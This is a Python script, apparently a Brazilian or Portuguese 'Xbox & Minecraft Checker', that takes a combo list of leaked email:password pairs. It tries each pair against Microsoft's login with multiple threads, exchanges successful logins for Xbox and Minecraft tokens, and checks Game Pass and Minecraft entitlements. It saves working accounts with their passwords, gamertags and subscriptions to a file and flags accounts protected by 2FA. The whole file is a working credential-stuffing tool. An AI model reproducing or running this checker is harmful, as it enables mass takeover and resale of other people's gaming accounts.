#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Xbox & Minecraft Checker - Versão CLI (Corrigida)
Uso: python3 xbox_checker.py combos.txt
Saída: valid_accounts.txt
"""

import sys
import re
import base64
import time
import threading
import requests
import urllib3
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed

# Suprime avisos de certificado HTTPS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# CONFIGURAÇÕES
# ==========================================
INPUT_FILE = "combos.txt"          # Arquivo com email:senha
OUTPUT_FILE = "valid_accounts.txt" # Onde salvar as contas válidas
THREADS = 10                       # Número de threads

# ==========================================
# FUNÇÕES DE AUTENTICAÇÃO MICROSOFT/XBOX
# ==========================================
SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

def get_sftag(session):
    try:
        response = session.get(SFTAG_URL, timeout=10)
        text = response.text
        # Tenta extrair o PPFT de várias formas
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        sftag = match.group(1) if match else None
        
        # Extrai o urlPost
        match2 = re.search(r'urlPost["\']?\s*:\s*["\']([^"\']+)["\']|urlPost":"([^"]+)"|urlPost\':\'([^\']+)\'|urlPost\\?"\\?:\\?"([^"\\]+)', text)
        urlPost = next(g for g in match2.groups() if g) if match2 else None
        
        return urlPost, sftag
    except Exception as e:
        print(f"[DEBUG] get_sftag error: {e}")
        return None, None

def microsoft_auth(session, email, password, url_post, sftag):
    try:
        data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': sftag,
            'PPSX': 'Passport',
            'type': '11',
            'LoginOptions': '3',
            'i13': '0',
            'm13': '0',
            'aid': '0',
            'reauth': '0',
            'ps': '2',
            'psRNG': '0',
            'ph': '0',
            'uaid': '0',
            'ru': 'https://login.live.com/oauth20_desktop.srf'
        }
        # Envia o POST
        r = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
        
        # Verifica se houve redirecionamento com token
        if '#' in r.url and r.url != SFTAG_URL:
            token = parse_qs(urlparse(r.url).fragment).get('access_token', ["None"])[0]
            if token != "None":
                return token, "success"
        
        # Verifica se há página de 2FA ou recuperação
        if any(v in r.text for v in ["recover?mkt", "account.live.com/identity/confirm", "Email/Confirm", "/Abuse?mkt="]):
            return None, "2fa"
        
        # Verifica se a senha está incorreta
        if any(v in r.text.lower() for v in ["password is incorrect", "account doesn't exist"]):
            return None, "bad"
        
        # Verifica se há um formulário de erro
        if "sign in" in r.text.lower() and "error" in r.text.lower():
            return None, "bad"
        
        # Se não conseguiu token, mas também não é erro claro, retorna "error"
        return None, "error"
        
    except Exception as e:
        print(f"[DEBUG] microsoft_auth exception: {e}")
        return None, "error"

def get_xbox_token(session, ms_token):
    try:
        payload = {
            "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT"
        }
        r = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
        if r.status_code == 200:
            data = r.json()
            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
    except Exception as e:
        print(f"[DEBUG] get_xbox_token error: {e}")
        pass
    return None, None

def get_xsts_token(session, xbox_token):
    try:
        payload = {
            "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
            "RelyingParty": "rp://api.minecraftservices.com/",
            "TokenType": "JWT"
        }
        r = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
        if r.status_code == 200:
            return r.json().get('Token')
    except Exception as e:
        print(f"[DEBUG] get_xsts_token error: {e}")
        pass
    return None

def get_xbox_profile(session, uhs, xsts_token):
    try:
        r = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep",
                        headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2"}, timeout=15)
        if r.status_code == 200:
            data = r.json()
            settings = {s["id"]: s.get("value", "N/A") for s in data.get("profileUsers", [{}])[0].get("settings", [])}
            return {"gamertag": settings.get("Gamertag", "N/A"), "tier": settings.get("AccountTier", "N/A"), "rep": settings.get("XboxOneRep", "N/A")}
    except Exception as e:
        print(f"[DEBUG] get_xbox_profile error: {e}")
        pass
    return {"gamertag": "N/A", "tier": "N/A", "rep": "N/A"}

def get_minecraft_token(session, uhs, xsts_token):
    try:
        r = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                         json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                         headers={'Content-Type': 'application/json'}, timeout=15)
        if r.status_code == 200:
            return r.json().get('access_token')
    except Exception as e:
        print(f"[DEBUG] get_minecraft_token error: {e}")
        pass
    return None

def check_entitlements(session, mc_token):
    try:
        r = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=15)
        if r.status_code == 200:
            text = r.text
            if 'product_game_pass_ultimate' in text:
                return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
            elif 'product_game_pass_premium' in text:
                return 'Xbox Game Pass Premium', ["Xbox Game Pass Premium"]
            elif 'product_game_pass_essential' in text:
                return 'Xbox Game Pass Essential', ["Xbox Game Pass Essential"]
            elif 'product_game_pass_pc' in text:
                return 'Xbox Game Pass PC', ["Xbox Game Pass PC"]
            elif '"product_minecraft"' in text:
                return 'Minecraft', ["Minecraft Java"]
            else:
                others = []
                if 'product_minecraft_bedrock' in text:
                    others.append("Bedrock")
                if 'product_legends' in text:
                    others.append("Legends")
                if 'product_dungeons' in text:
                    others.append("Dungeons")
                if others:
                    return 'Xbox: ' + ', '.join(others), others
    except Exception as e:
        print(f"[DEBUG] check_entitlements error: {e}")
        pass
    return None, []

def get_profile(session, mc_token):
    try:
        r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=15)
        if r.status_code == 200:
            return r.json()
    except Exception as e:
        print(f"[DEBUG] get_profile error: {e}")
        pass
    return None

def check_account(email, password):
    """
    Retorna um dicionário com resultado da verificação.
    """
    session = requests.Session()
    session.verify = False  # Desabilita verificação SSL (já suprimimos o aviso)

    url_post, sftag = get_sftag(session)
    if not url_post or not sftag:
        return {"status": "error", "message": "SFTAG não encontrado"}

    ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)

    if auth_status == "2fa":
        return {"status": "2fa", "message": "Conta com 2FA / OTP Ativo"}
    elif auth_status == "bad":
        return {"status": "bad", "message": "Credenciais inválidas"}
    elif auth_status != "success" or not ms_token:
        # Imprime detalhes para debug (opcional)
        # print(f"[DEBUG] Falha na autenticação. Resposta: {getattr(session, 'last_response', '')}")
        return {"status": "error", "message": "Falha na autenticação"}

    xbox_token, uhs = get_xbox_token(session, ms_token)
    if not xbox_token or not uhs:
        return {"status": "error", "message": "Conta Microsoft sem vínculo Xbox"}

    xsts_token = get_xsts_token(session, xbox_token)
    if not xsts_token:
        return {"status": "error", "message": "Erro ao obter token XSTS"}

    xbox_profile = get_xbox_profile(session, uhs, xsts_token)
    gamertag = xbox_profile.get("gamertag", "N/A")
    tier = xbox_profile.get("tier", "N/A")
    rep = xbox_profile.get("rep", "N/A")

    mc_token = get_minecraft_token(session, uhs, xsts_token)
    if not mc_token:
        return {
            "status": "xbox_only",
            "gamertag": gamertag,
            "tier": tier,
            "rep": rep,
            "mc_name": "N/A",
            "subs": "None",
            "message": "Conta Xbox (sem Minecraft)"
        }

    account_type, subs = check_entitlements(session, mc_token)
    if not account_type:
        return {
            "status": "xbox_only",
            "gamertag": gamertag,
            "tier": tier,
            "rep": rep,
            "mc_name": "N/A",
            "subs": "None",
            "message": "Conta Xbox (sem assinaturas Minecraft)"
        }

    profile = get_profile(session, mc_token)
    mc_name = profile.get('name', 'N/A') if profile else "Not Set"
    subs_str = ", ".join(subs) if subs else "None"

    return {
        "status": "success",
        "account_type": account_type,
        "gamertag": gamertag,
        "tier": tier,
        "rep": rep,
        "mc_name": mc_name,
        "subs": subs_str,
        "message": "Conta válida com assinaturas"
    }

# ==========================================
# FUNÇÕES AUXILIARES
# ==========================================
def parse_credentials(line):
    line = line.strip()
    if not line:
        return None, None
    parts = re.split(r'[:;,\t]', line, maxsplit=1)
    if len(parts) != 2:
        return None, None
    email, password = parts[0].strip(), parts[1].strip()
    return (email, password) if email and password else (None, None)

# ==========================================
# MAIN
# ==========================================
def main():
    if len(sys.argv) > 1:
        input_file = sys.argv[1]
    else:
        input_file = INPUT_FILE

    try:
        with open(input_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
    except FileNotFoundError:
        print(f"❌ Arquivo {input_file} não encontrado.")
        sys.exit(1)

    combos = []
    for line in lines:
        email, password = parse_credentials(line)
        if email and password:
            combos.append((email, password))

    if not combos:
        print("❌ Nenhuma credencial válida encontrada.")
        sys.exit(1)

    print(f"📦 Carregadas {len(combos)} combos.")
    print(f"⚡ Threads: {THREADS}")
    print(f"📁 Saída: {OUTPUT_FILE}")
    print()

    valid_accounts = []
    lock = threading.Lock()
    processed = 0
    valid = 0
    error = 0
    bad = 0
    twofa = 0

    def worker(email, password):
        nonlocal processed, valid, error, bad, twofa
        result = check_account(email, password)
        with lock:
            processed += 1
            if result["status"] == "success":
                valid += 1
                entry = (
                    f"Email: {email}\n"
                    f"Senha: {password}\n"
                    f"Gamertag: {result['gamertag']}\n"
                    f"Tier: {result['tier']}\n"
                    f"Rep: {result['rep']}\n"
                    f"MC Name: {result['mc_name']}\n"
                    f"Assinaturas: {result['subs']}\n"
                    f"Tipo: {result['account_type']}\n"
                    f"{'='*40}\n"
                )
                valid_accounts.append(entry)
                print(f"✅ {email} – {result['account_type']} (Gamertag: {result['gamertag']})")
            elif result["status"] == "xbox_only":
                valid += 1
                entry = (
                    f"Email: {email}\n"
                    f"Senha: {password}\n"
                    f"Gamertag: {result['gamertag']}\n"
                    f"Tier: {result['tier']}\n"
                    f"Rep: {result['rep']}\n"
                    f"MC Name: N/A\n"
                    f"Assinaturas: None\n"
                    f"Tipo: Xbox Only\n"
                    f"{'='*40}\n"
                )
                valid_accounts.append(entry)
                print(f"✅ {email} – Xbox Only (Gamertag: {result['gamertag']})")
            elif result["status"] == "2fa":
                twofa += 1
                print(f"🔐 {email} – 2FA detectado (não verificado)")
            elif result["status"] == "bad":
                bad += 1
                print(f"❌ {email} – Credenciais inválidas")
            else:
                error += 1
                print(f"⚠️ {email} – {result.get('message', 'Erro desconhecido')}")

            # Progresso
            print(f"[{processed}/{len(combos)}] ", end="", flush=True)

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(worker, email, password) for email, password in combos]
        for _ in as_completed(futures):
            pass

    if valid_accounts:
        with open(OUTPUT_FILE, 'w', encoding='utf-8') as f:
            f.write("\n".join(valid_accounts))
        print(f"\n📁 {len(valid_accounts)} contas válidas salvas em {OUTPUT_FILE}.")
    else:
        print("\n📁 Nenhuma conta válida encontrada.")

    print("\n" + "="*50)
    print("RESUMO FINAL")
    print(f"Total: {len(combos)}")
    print(f"✅ Válidas (com assinatura): {valid}")
    print(f"🔐 2FA: {twofa}")
    print(f"❌ Inválidas: {bad}")
    print(f"⚠️  Erros: {error}")
    print("="*50)

if __name__ == "__main__":
    main()
